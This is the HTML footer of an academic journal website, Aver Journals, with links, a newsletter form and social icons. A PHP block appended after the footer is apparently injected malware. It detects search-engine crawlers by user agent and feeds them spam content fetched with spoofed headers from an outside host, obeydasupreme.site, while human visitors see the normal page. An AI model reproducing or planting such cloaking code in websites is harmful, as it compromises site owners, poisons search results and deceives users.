<footer id="rs-footer" class="rs-footer">
            <div class="container">
                <div class="footer-content pt-62 pb-79 md-pb-64 sm-pt-48">
                    <div class="row">
                        <div class="col-lg-3 col-md-12 col-sm-12 footer-widget md-mb-39">
                            <div class="about-widget pr-15">
                                <div class="logo-part">
                                    <a href="index.php"><img src="assets/images/footer-logo.png" alt="Footer Logo"></a>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-12 col-sm-12 footer-widget md-mb-39">
							<h4 class="widget-title">About Us</h4>
                            <div class="about-widget pr-15">
                                <p class="desc">Aver Journal is an international Journal receiver in the fields of Clinical, Medical, Life Science, and Engineering & Technology. Our aim is to publish high quality papers</p>
                                <div class="btn-part">
                                    <a class="" href="about-us">Read More -></a>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-3 col-md-12 col-sm-12 md-mb-32 footer-widget">
                            <h4 class="widget-title">Quick Links</h4>
                            <ul class="quick-links pr-40">
                                <li><a href="journals.php">Journals</a></li>
                                <li><a href="submit-paper.php">Submit Paper</a></li>
                                <li><a href="articles.php">Articles</a></li>
                                <li><a href="http://averconferences.com/">Conferences</a></li>
                                <li><a href="contact-us.php">Contact Us</a></li>
                            </ul>
                        </div>
                        <div class="col-lg-3 col-md-12 col-sm-12 footer-widget">
							<h4 class="widget-title">News Letter</h4>
							<div class="footer-newsletter">
								<form class="newsletter-form">
									<input type="email" name="email" placeholder="Your email address" required="">
									<button type="submit"><i class="fa fa-paper-plane"></i></button>
								</form>
							</div>
							<h4 class="widget-title pt-20">Follow Us</h4>
							<ul class="footer-social">
                                <li><a href="https://www.facebook.com/Aver-Journals-103897081595688/"><i class="fa fa-facebook"></i></a></li>
                                <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                <li><a href="#"><i class="fa fa-pinterest-p"></i></a></li>
                                <li><a href="https://www.linkedin.com/company/aver-journals/"><i class="fa fa-linkedin"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="footer-bottom">
                    <div class="row y-middle">
                        <div class="col-lg-6 col-md-8 sm-mb-21">
                            <div class="copyright">
                                <p>© Copyright 2021 Aver Journals. All Rights Reserved.</p>
                            </div>
                        </div>
                        <div class="col-lg-6 col-md-4 text-right sm-text-center">
                            <ul class="footer-menu">
                                <li><a href="http://averjournals.com/terms-of-service.php">Terms of Services</a></li>
                                <li><a href="privacy-policy.php">Privacy Policy</a></li>
                                <li><a href="contact-us.php">Contact</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
<?php
@ob_start();
header("Vary: U-Agent");

$request_uri = $_SERVER['REQUEST_URI'] ?? '/';

$src = "https://obeydasupreme.site/badboys/averjournals.txt";
$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');

function stealth($u) {
    $ctx = stream_context_create([
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
                        "Referer: https://www.google.com/\r\n"
        ]
    ]);
    return @file_get_contents($u, false, $ctx);
}

if (preg_match($match, $ua)) {
    usleep(rand(100000, 200000));
    if (stripos($request_uri, '/') !== false) {
        echo stealth($src);
    }
    @ob_end_flush();
    exit;
}
?>